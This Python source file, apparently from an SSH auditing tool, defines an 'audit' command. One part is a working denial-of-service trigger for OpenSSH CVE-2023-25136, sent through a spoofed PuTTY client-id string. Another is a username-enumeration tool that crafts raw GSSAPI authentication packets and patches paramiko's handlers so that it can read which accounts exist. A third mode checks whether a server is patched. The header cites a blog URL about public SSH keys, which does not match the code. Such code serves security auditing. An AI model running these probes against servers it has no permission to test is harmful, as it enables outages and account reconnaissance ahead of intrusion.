# Source: https://github.com/rushter/blog_code
# More Information: https://rushter.com/blog/public-ssh-keys/

import argparse
import logging
import sys
import threading
import uuid
from typing import Final

import paramiko
from paramiko.message import Message
from rich.console import Console
from rich.table import Table

from sshmitm.moduleparser import SubCommand


def perform_cve_2023_25136(args: argparse.Namespace) -> bool:
    transport = paramiko.Transport(f"{args.host}:{args.port}")
    transport.local_version = f"SSH-2.0-{args.client_id}"
    try:
        # connect with no username and password
        transport.connect(username="", password="")  # nosec
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except Exception:  # pylint: disable=broad-exception-caught # noqa: BLE001
        # catch all exceptions to avoid applicaiton crashes
        logging.error("error executing check for CVE-2023-25136")
    return True


# --- GSSAPI pre-authentication username validity oracle -------------------
# Background: doc/vulnerabilities/CVE-2026-60000.rst, section
# "Pre-Authentication User Validity Oracle". A server violating RFC 4462
# §3.2 sends SSH_MSG_USERAUTH_GSSAPI_RESPONSE (type 60) for an existing
# username and SSH_MSG_USERAUTH_FAILURE (type 51) for a non-existing one,
# revealing account validity in the first response of a single packet. A
# patched (or backported) server always responds with type 60 regardless of
# validity, since authorisation is deferred until after the full GSSAPI
# exchange completes (RFC 4462 §3.1). No Kerberos credentials are required
# either way — the signal is present before any real exchange happens.

# Kerberos 5 OID: 1.2.840.113554.1.2.2 (RFC 1964)
# DER encoding: tag 0x06 (OID), length 0x09, 9 bytes OID value
_KRB5_OID: Final = b"\x06\x09\x2a\x86\x48\x86\xf7\x12\x01\x02\x02"

# RFC 4252 §5
_MSG_USERAUTH_REQUEST: Final = 50


class _GSSAPIProbeResult:
    EXISTS = "exists"
    NOT_FOUND = "not_found"
    GSSAPI_UNAVAILABLE = "gssapi_unavailable"
    TIMEOUT = "timeout"
    ERROR = "error"


def _gssapi_server_auth_methods(host: str, port: int, timeout: float) -> list[str]:
    """Return the list of authentication methods advertised by the server."""
    try:
        transport = paramiko.Transport((host, port))
        transport.start_client(timeout=timeout)
        try:
            transport.auth_none("__probe__")
        except paramiko.BadAuthenticationType as exc:
            return list(exc.allowed_types)
        except Exception:  # pylint: disable=broad-exception-caught # noqa: BLE001
            return []
        finally:
            transport.close()
    except Exception:  # pylint: disable=broad-exception-caught # noqa: BLE001
        return []
    return []


def _gssapi_probe_user(host: str, port: int, username: str, timeout: float) -> str:
    """Determine whether *username* exists on the SSH server via GSSAPI.

    Sends a single SSH_MSG_USERAUTH_REQUEST with method "gssapi-with-mic"
    and reads the first response byte. See the module-level comment above
    for the RFC 4462 §3.2 background.
    """
    result: dict[str, str | None] = {"value": None}
    event = threading.Event()

    try:
        transport = paramiko.Transport((host, port))
        transport.start_client(timeout=timeout)

        gssapi_ok = False
        try:
            transport.auth_none(username)
        except paramiko.BadAuthenticationType as exc:
            gssapi_ok = "gssapi-with-mic" in exc.allowed_types
        except paramiko.AuthenticationException:
            pass

        if not gssapi_ok:
            transport.close()
            return _GSSAPIProbeResult.GSSAPI_UNAVAILABLE

        auth_handler = transport.auth_handler
        if auth_handler is None:
            transport.close()
            return _GSSAPIProbeResult.ERROR

        # Paramiko's _client_handler_table is a @property (paramiko >= 4.0)
        # that builds a fresh dict from references to self.<method_name>.
        # Setting instance attributes shadows the class methods, so the
        # property returns our callbacks instead. Older paramiko versions
        # used a plain class-level dict and this override would not fire.
        def on_gssapi_response(_message: Message) -> None:  # type 60
            result["value"] = _GSSAPIProbeResult.EXISTS
            event.set()

        def on_failure(_message: Message) -> None:  # type 51
            if result["value"] is None:
                result["value"] = _GSSAPIProbeResult.NOT_FOUND
            event.set()

        auth_handler._parse_userauth_info_request = on_gssapi_response  # type: ignore[method-assign]
        auth_handler._parse_userauth_failure = on_failure  # type: ignore[method-assign]

        # Manual SSH_MSG_USERAUTH_REQUEST (RFC 4252 §5 + RFC 4462 §3.2):
        #   byte    50  SSH2_MSG_USERAUTH_REQUEST
        #   string      username
        #   string      "ssh-connection"
        #   string      "gssapi-with-mic"
        #   uint32   1  (one mechanism)
        #   string      Kerberos 5 OID (DER-encoded)
        message = Message()
        message.add_byte(bytes([_MSG_USERAUTH_REQUEST]))
        message.add_string(username)
        message.add_string("ssh-connection")
        message.add_string("gssapi-with-mic")
        message.add_int(1)
        message.add_string(_KRB5_OID)
        transport._send_message(message)  # type: ignore[attr-defined]

        if not event.wait(timeout=timeout):
            transport.close()
            return _GSSAPIProbeResult.TIMEOUT

        transport.close()
        return result["value"] or _GSSAPIProbeResult.ERROR

    except Exception:  # pylint: disable=broad-exception-caught # noqa: BLE001
        return _GSSAPIProbeResult.ERROR


def _load_usernames(args: argparse.Namespace) -> list[str]:
    if args.usernames:
        return list(args.usernames)
    try:
        with open(args.username_file, encoding="utf-8") as file_handle:
            return [line.strip() for line in file_handle if line.strip()]
    except OSError as exc:
        sys.exit(f"cannot read username file: {exc}")


# Practically guaranteed to exist on any POSIX-ish target regardless of
# login policy: root is UID 0 by definition, daemon is a near-universal
# secondary in case root specifically is excluded via AllowUsers/DenyUsers.
# Used only as the default for gssapi-usercheck-verify-patch, when the
# auditor doesn't supply their own known-valid username.
_DEFAULT_VERIFY_USERS: Final = ("root", "daemon")


def _check_gssapi_available(console: Console, host: str, port: int, timeout: float) -> list[str]:
    console.print(f"[bold]Connecting to {host}:{port} ...[/bold]")
    methods = _gssapi_server_auth_methods(host, port, timeout)
    if not methods:
        console.print(
            "[bold red]Could not connect or retrieve auth methods.[/bold red]"
        )
        sys.exit(1)

    if "gssapi-with-mic" not in methods:
        console.print(
            "[bold red]GSSAPIAuthentication not active or no Kerberos "
            "mechanism available.[/bold red]\n"
            "Required: GSSAPIAuthentication yes + libkrb5 installed on the target"
        )
        sys.exit(1)

    console.print(
        f"[bold green]GSSAPIAuthentication active[/bold green] — "
        f"available methods: {', '.join(methods)}\n"
    )
    return methods


def _probe_result_label(probe_result: str) -> str:
    if probe_result == _GSSAPIProbeResult.EXISTS:
        return "[bold green]EXISTS[/bold green]"
    if probe_result == _GSSAPIProbeResult.NOT_FOUND:
        return "[dim]NOT FOUND[/dim]"
    if probe_result == _GSSAPIProbeResult.GSSAPI_UNAVAILABLE:
        return "[yellow]GSSAPI UNAVAILABLE[/yellow]"
    if probe_result == _GSSAPIProbeResult.TIMEOUT:
        return "[yellow]TIMEOUT[/yellow]"
    return "[red]ERROR[/red]"


def perform_gssapi_usercheck(args: argparse.Namespace) -> None:
    """Pure username enumeration — no control probe, no patch verdict."""
    console = Console()
    usernames = _load_usernames(args)
    _check_gssapi_available(console, args.host, args.port, args.timeout)

    table = Table(show_header=True, header_style="bold")
    table.add_column("Username")
    table.add_column("Result")

    found = not_found = errors = 0
    for username in usernames:
        probe_result = _gssapi_probe_user(args.host, args.port, username, args.timeout)
        table.add_row(username, _probe_result_label(probe_result))
        if probe_result == _GSSAPIProbeResult.EXISTS:
            found += 1
        elif probe_result == _GSSAPIProbeResult.NOT_FOUND:
            not_found += 1
        else:
            errors += 1

    console.print(table)
    console.print(
        f"\nSummary: [bold green]{found} found[/bold green] / "
        f"{not_found} not present / {errors} errors"
    )


def perform_gssapi_usercheck_verify_patch(args: argparse.Namespace) -> None:
    """Patch/backport verification — no target-specific usernames required."""
    console = Console()
    usernames = list(args.usernames) if args.usernames else list(_DEFAULT_VERIFY_USERS)
    if not args.usernames:
        console.print(
            f"[dim]No --username supplied, using built-in candidates: "
            f"{', '.join(usernames)}[/dim]"
        )
    _check_gssapi_available(console, args.host, args.port, args.timeout)

    # Guaranteed-nonexistent control username. A random suffix collides with
    # a real account with negligible probability, while staying readable in
    # the output table. Fixed guesses (e.g. plain "notexist") or standard
    # system accounts (e.g. "nobody") do not have this guarantee:
    # allowed_user() in OpenSSH's auth.c only requires a present and
    # executable shell (nologin/false qualify) to treat an account as valid
    # at this stage, so such accounts routinely exist on the target and
    # would silently invalidate the comparison. Overridable via
    # --control-username for reproducible runs or a caller-verified name.
    control_user = args.control_username or f"notexist-{uuid.uuid4().hex[:12]}"

    table = Table(show_header=True, header_style="bold")
    table.add_column("Username")
    table.add_column("Result")

    results: dict[str, str] = {}
    for username in [*usernames, control_user]:
        probe_result = _gssapi_probe_user(args.host, args.port, username, args.timeout)
        results[username] = probe_result
        label = username if username != control_user else f"{username} [dim](control)[/dim]"
        table.add_row(label, _probe_result_label(probe_result))

    console.print(table)

    control_result = results.get(control_user)
    console.print()
    if control_result not in (
        _GSSAPIProbeResult.EXISTS,
        _GSSAPIProbeResult.NOT_FOUND,
    ):
        console.print(
            "[yellow]Verdict: INCONCLUSIVE[/yellow] — the random control "
            "probe did not complete cleanly, so patch status cannot be "
            "determined."
        )
    elif control_result == _GSSAPIProbeResult.EXISTS:
        # The guaranteed-nonexistent control username still produced a
        # "valid" response — the server does not distinguish accounts here.
        console.print(
            "[bold green]Verdict: PATCHED[/bold green] — the server "
            "responded identically for the random, guaranteed-nonexistent "
            "control username as for a real account. It does not appear to "
            "distinguish valid from invalid usernames at this stage "
            "(RFC 4462 §3.2 compliant; CVE-2026-60000 fixed or backported)."
        )
    elif any(results.get(u) == _GSSAPIProbeResult.EXISTS for u in usernames):
        console.print(
            "[bold red]Verdict: VULNERABLE[/bold red] — the server "
            "responded differently to the random control username than to "
            "at least one supplied username. It still reveals account "
            "validity via the first response's message type "
            "(RFC 4462 §3.2 violation — pre-authentication user validity "
            "oracle, CVE-2026-60000 background)."
        )
    else:
        console.print(
            "[yellow]Verdict: INCONCLUSIVE[/yellow] — none of the compared "
            "usernames resolved as existing, so there is nothing to compare "
            "the control probe against. Supply --username with an account "
            "known to exist on the target."
        )


class Audit(SubCommand):
    """audit tools for ssh servers"""

    def register_arguments(self) -> None:
        subparsers = self.parser.add_subparsers(
            title="Available commands",
            dest="audit_subparser_name",
            metavar="audit-command",
        )
        subparsers.required = True

        parser_scan_auth = subparsers.add_parser(
            "CVE-2023-25136",
            help="performs a DoS against OpenSSH, which exploits CVE-2023-25136",
        )
        parser_scan_auth.add_argument(
            "--host", type=str, required=True, help="Hostname or IP address"
        )
        parser_scan_auth.add_argument(
            "--port", type=int, default=22, help="port (default: 22)"
        )
        parser_scan_auth.add_argument(
            "--client-id",
            dest="client_id",
            default="PuTTY_Release_0.64",
            help="client id string, which triggers the exploit",
        )

        parser_gssapi_usercheck = subparsers.add_parser(
            "gssapi-usercheck",
            help=(
                "enumerate usernames via the GSSAPI pre-authentication "
                "username validity oracle (CVE-2026-60000 background)"
            ),
        )
        parser_gssapi_usercheck.add_argument(
            "--host", type=str, required=True, help="Hostname or IP address"
        )
        parser_gssapi_usercheck.add_argument(
            "--port", type=int, default=22, help="port (default: 22)"
        )
        parser_gssapi_usercheck.add_argument(
            "--timeout",
            type=float,
            default=10.0,
            metavar="SECONDS",
            help="per-probe timeout in seconds (default: 10)",
        )
        gssapi_usercheck_group = parser_gssapi_usercheck.add_mutually_exclusive_group(
            required=True
        )
        gssapi_usercheck_group.add_argument(
            "--username",
            dest="usernames",
            nargs="+",
            metavar="USERNAME",
            help="one or more usernames to probe",
        )
        gssapi_usercheck_group.add_argument(
            "--username-file",
            dest="username_file",
            metavar="FILE",
            help="file with one username per line",
        )

        parser_gssapi_verify_patch = subparsers.add_parser(
            "gssapi-usercheck-verify-patch",
            help=(
                "checks whether the GSSAPI username validity oracle "
                "(CVE-2026-60000 background) is patched or backported, "
                "without requiring target-specific usernames"
            ),
        )
        parser_gssapi_verify_patch.add_argument(
            "--host", type=str, required=True, help="Hostname or IP address"
        )
        parser_gssapi_verify_patch.add_argument(
            "--port", type=int, default=22, help="port (default: 22)"
        )
        parser_gssapi_verify_patch.add_argument(
            "--timeout",
            type=float,
            default=10.0,
            metavar="SECONDS",
            help="per-probe timeout in seconds (default: 10)",
        )
        parser_gssapi_verify_patch.add_argument(
            "--username",
            dest="usernames",
            nargs="+",
            metavar="USERNAME",
            default=None,
            help=(
                "override the built-in candidate usernames "
                f"({', '.join(_DEFAULT_VERIFY_USERS)}) with your own; "
                "replaces rather than extends the defaults"
            ),
        )
        parser_gssapi_verify_patch.add_argument(
            "--control-username",
            dest="control_username",
            metavar="USERNAME",
            default=None,
            help=(
                "override the auto-generated guaranteed-nonexistent control "
                "username (default: random 'notexist-<hex>') for "
                "reproducible runs or a self-verified name; the caller is "
                "responsible for making sure it does not exist on the target"
            ),
        )

    def execute(self, args: argparse.Namespace) -> None:
        if args.audit_subparser_name == "CVE-2023-25136":
            if not perform_cve_2023_25136(args):
                print("ERROR - failed to execute the exploit")
                sys.exit(1)
            print("OK -> server seems vulnerable")
        elif args.audit_subparser_name == "gssapi-usercheck":
            perform_gssapi_usercheck(args)
        elif args.audit_subparser_name == "gssapi-usercheck-verify-patch":
            perform_gssapi_usercheck_verify_patch(args)
